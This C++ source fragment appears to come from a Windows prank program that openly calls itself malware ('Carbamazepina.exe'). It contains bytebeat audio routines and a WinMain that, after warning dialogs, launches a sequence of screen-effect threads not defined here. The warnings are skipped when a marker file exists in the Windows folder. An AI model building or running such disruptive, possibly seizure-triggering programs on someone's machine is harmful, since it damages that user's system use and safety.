VOID WINAPI BYTEBEAT1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            t * (t >> 10 ^ t) + t / 6
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            (t + ((t >> 6 ^ t) + (t >> 3 & (t & 4096 ? 5 : 7) - 4)) - (t >> 6)) + ((t & t >> 12) * (t >> 4 | t >> 8)) / 5 + 3e7
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            t * (t ^ t * 257 / 256) >> 8 << 7
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            t * ((t >> 10 & t >> 7) ^ t) + t / 10
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            t * (t >> 12 ^ t) >> 6 ^ t * (t & t >> 12) >> 6 / 59
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            ((t * t * t + t) % 255 | t >> 4 | t >> 5 | t % 255 + (t >> 16)) + 1 >> (t >> 1) / 4
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            (((2 * t & 255) * (t >> 2 & 255) >> 4) ^ (t / (16 - (1 / 12)))) + (t >> 10)
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            t * (t & t >> 12) >> 8 ^ t * (((t & t >> 12) ^ (t & t >> 14)) + 256) / 255
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            (t * ((t >> 15 | t >> 8) & (20 | 7 * (t >> 19) >> t | t >> 3))) / 6
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEAT10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            (10 * (t >> 4 | t >> 7 | t | t << 2) + (1 ^ t >> 7 & t)) + ((t & t >> 12) ^ (t >> 4 & t >> 8)) | (15 * (t >> 7 | t | t >> 4) ^ (t >> 3) ^ (t & t >> 16))
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI BYTEBEATBREAK() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(
            (t) << 5
            );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int WINAPI WinMain(HINSTANCE hInst, HINSTANCE b, LPSTR c, INT d) {
    if (GetFileAttributesW(L"C:\\Windows\\WinNet.exe") == INVALID_FILE_ATTRIBUTES) {
        if (MessageBoxW(NULL, L"Run malware?", L"Carbamazepina.exe by UltraDasher965 & BrunitoGV10", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
        if (MessageBoxW(NULL, L"Are You Really Sure? it will programs, it a malwares work bounce windows, and your safety epilepsy.", L"Carbamazepina.exe by UltraDasher965 & BrunitoGV10 - FINAL WARNING", MB_ICONWARNING | MB_YESNO) != IDYES) return 1;
    }
    Sleep(9000);
    HANDLE thread1 = CreateThread(0, 0, ICON, 0, 0, 0);
    HANDLE thread1dot1 = CreateThread(0, 0, GDI1, 0, 0, 0);
    BYTEBEAT1();
    Sleep(30000);
    TerminateThread(thread1dot1, 0);
    CloseHandle(thread1dot1);
    HANDLE thread2 = CreateThread(0, 0, GDI2, 0, 0, 0);
    BYTEBEAT2();
    Sleep(30000);
    TerminateThread(thread2, 0);
    CloseHandle(thread2);
    HANDLE thread3 = CreateThread(0, 0, GDI3, 0, 0, 0);
    BYTEBEAT3();
    Sleep(30000);
    TerminateThread(thread3, 0);
    CloseHandle(thread3);
    HANDLE thread4 = CreateThread(0, 0, GDI4, 0, 0, 0);
    HANDLE thread4dot1 = CreateThread(0, 0, TEXTOUTS1, 0, 0, 0);
    BYTEBEAT4();
    Sleep(30000);
    TerminateThread(thread4, 0);
    CloseHandle(thread4);
    HANDLE thread5 = CreateThread(0, 0, GDI5, 0, 0, 0);
    HANDLE thread5dot1 = CreateThread(0, 0, SQUARES1, 0, 0, 0);
    HANDLE thread5dot2 = CreateThread(0, 0, SQUARES2, 0, 0, 0);
    BYTEBEAT5();
    Sleep(30000);
    TerminateThread(thread5, 0);
    CloseHandle(thread5);
    HANDLE thread6 = CreateThread(0, 0, GDI6, 0, 0, 0);
    BYTEBEAT6();
    Sleep(30000);
    HANDLE thread7 = CreateThread(0, 0, GDI7, 0, 0, 0);
    HANDLE thread7dot1 = CreateThread(0, 0, POSTGDI1, 0, 0, 0);
    BYTEBEAT7();
    Sleep(30000);
    TerminateThread(thread6, 0);
    CloseHandle(thread6);
    TerminateThread(thread7, 0);
    CloseHandle(thread7);
    TerminateThread(thread7dot1, 0);
    CloseHandle(thread7dot1);
    HANDLE thread8 = CreateThread(0, 0, GDI8, 0, 0, 0);
    HANDLE thread8dot1 = CreateThread(0, 0, POSTGDI2, 0, 0, 0);
    BYTEBEAT8();
    Sleep(30000);
    TerminateThread(thread8, 0);
    CloseHandle(thread8);
    TerminateThread(thread8dot1, 0);
    CloseHandle(thread8dot1);
    HANDLE thread9 = CreateThread(0, 0, GDI9, 0, 0, 0);
    BYTEBEAT9();
    Sleep(30000);
    TerminateThread(thread9, 0);
    CloseHandle(thread9);
    HANDLE thread10 = CreateThread(0, 0, GDI10, 0, 0, 0);
    BYTEBEAT10();
    Sleep(30000);
    TerminateThread(thread10, 0);
    CloseHandle(thread10);
    HANDLE thread11 = CreateThread(0, 0, POSTGDI1, 0, 0, 0);
    BYTEBEATBREAK();
    Sleep(30000);
}